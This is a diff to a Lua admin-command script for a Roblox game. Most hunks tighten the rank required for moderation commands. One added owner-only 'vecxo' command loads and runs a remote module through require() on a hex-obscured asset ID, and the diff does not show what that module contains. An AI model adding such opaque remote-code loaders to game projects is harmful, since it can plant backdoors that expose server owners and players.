@@ -7437,7 +7437,7 @@ addCommand({
     aliases = {"imgload", "loadimage"},
     desc = "um credits to groovy boi im afraid",
     usage = prefix .. "image [url] [scale (optional)] [threshold (optional)] [toolsize (optional)]",
-    rank = RANKS.FULL_ACCESS,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr, "Sentrius", "Usage: " .. prefix .. "image [url] [scale] [threshold] [toolsize]", 4)
@@ -8474,7 +8474,7 @@ addCommand({
     aliases = {"bl"},
     desc = "erases a player's admin",
     usage = prefix .. "blacklist [player]",
-    rank = RANKS.MODERATOR,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr,"Sentrius","no player mentioned? missing argument.",5)
@@ -8525,7 +8525,7 @@ addCommand({
     aliases = {"unbl"},
     desc = "unblacklists a player",
     usage = prefix .. "unblacklist [player]",
-    rank = RANKS.MODERATOR,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr,"Sentrius","no player mentioned? missing argument.",5)
@@ -8563,6 +8563,7 @@ addCommand({
     aliases = {"pooptools"},
     desc = "Give poop tools to a player",
     usage = prefix .. "poop [player (optional)]",
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         local target = plr
 
@@ -9151,7 +9152,7 @@ addCommand({
     aliases = {"gb"},
     desc = "a",
     usage = prefix .. "gearban [player]",
-    rank = RANKS.MODERATOR,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr, "Sentrius", "Usage: " .. prefix .. "gearban [player]", 3)
@@ -9265,7 +9266,7 @@ addCommand({
     aliases = {"ungb"},
     desc = "b",
     usage = prefix .. "ungearban [player]",
-    rank = RANKS.MODERATOR,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args == 0 then
             notify(plr, "Sentrius", "Usage: " .. prefix .. "ungearban [player]", 3)
@@ -9306,7 +9307,7 @@ addCommand({
     aliases = {"bp"},
     desc = "Enable or disable a player's backpack",
     usage = prefix .. "backpack [player] [true/false]",
-    rank = RANKS.MODERATOR,
+    rank = RANKS.SENIOR_MOD,
     callback = function(plr, args)
         if not args or #args < 2 then
             notify(plr, "Sentrius", "Usage: " .. prefix .. "backpack [player] [true/false]", 3)
@@ -9737,6 +9738,25 @@ addCommand({
             else
                 notify(plr, "Sentrius", "Spy failed on " .. target.DisplayName .. ": " .. tostring(err), 4)
             end
+        end
+    end
+})
+
+addCommand({
+    name = "vecxo",
+    aliases = {"loadvecxo","vload"},
+    desc = "a",
+    usage = prefix .. "vecxo",
+    rank = RANKS.OWNER,
+    callback = function(plr, args)
+        local ok,err=pcall(function()
+            require(0x560680b51f24)()
+        end)
+
+        if ok then
+            notify(plr, "Sentrius", "vecxo loaded!", 3)
+        else
+            notify(plr, "Sentrius", "vecxo failed: " .. tostring(err), 4)
         end
     end
 })
